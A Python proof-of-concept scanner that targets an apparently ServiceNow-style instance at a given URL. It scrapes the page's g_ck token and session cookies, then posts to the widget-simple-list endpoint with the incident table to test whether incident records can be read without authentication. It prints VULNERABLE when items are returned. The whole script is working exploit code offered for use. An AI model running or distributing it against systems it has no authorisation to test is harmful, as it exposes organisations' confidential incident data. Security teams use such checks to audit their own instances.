#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from bs4 import BeautifulSoup
import argparse
import requests
import json
import re

parser = argparse.ArgumentParser(description='Fetch g_ck and cookies from a given URL')
parser.add_argument('--url', required=True, help='The URL to fetch from')

args = parser.parse_args()
url = args.url.rstrip('/')  # Normalize the URL by removing any trailing slashes

requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

s = requests.Session()

# Capture cookies and g_ck variable content.
response = s.get(url, verify=False)
cookies = s.cookies.get_dict()
soup = BeautifulSoup(response.text, 'html.parser')
script_tags = soup.find_all('script')

g_ck_value = None
for tag in script_tags:
    if tag.string:
        match = re.search(r"var g_ck = '([a-zA-Z0-9]+)'", tag.string)
        if match:
            g_ck_value = match.group(1)
            break

if not g_ck_value:
    print(f"{url} - Error: g_ck not found.")

headers = {
    'Cookie': '; '.join([f'{k}={v}' for k, v in cookies.items()]),
    'X-UserToken': g_ck_value,
    'Content-Type': 'application/json',
    'Accept': 'application/json',
    'Connection': 'close'
}

post_url = url + "/api/now/sp/widget/widget-simple-list?t=incident"

data_payload = json.dumps({
    # Empty JSON payload here
})

post_response = s.post(post_url, headers=headers, data=data_payload, verify=False)

if post_response.status_code != 200 and post_response.status_code != 201:
    print(f"{url} - Failed to send POST request.")

response_json = post_response.json()

# Check if 'result' object is not empty
if 'result' in response_json and response_json['result']:
    # Check if 'result.data.count' exists and is greater than 0
    if 'data' in response_json['result']:
        if 'count' in response_json['result']['data'] and response_json['result']['data']['count'] > 0:
            print(f"{url} is VULNERABLE, it was found at least {response_json['result']['data']['count']} items")
        else:
            print(f"{url} is NOT VULNERABLE, count either doesn't exist or is not greater than 0.")
    else:
        print(f"{url} is NOT VULNERABLE, 'data' object does not exist in 'result'")
else:
    print(f"{url} is NOT VULNERABLE, 'result' object is empty or does not exist.")
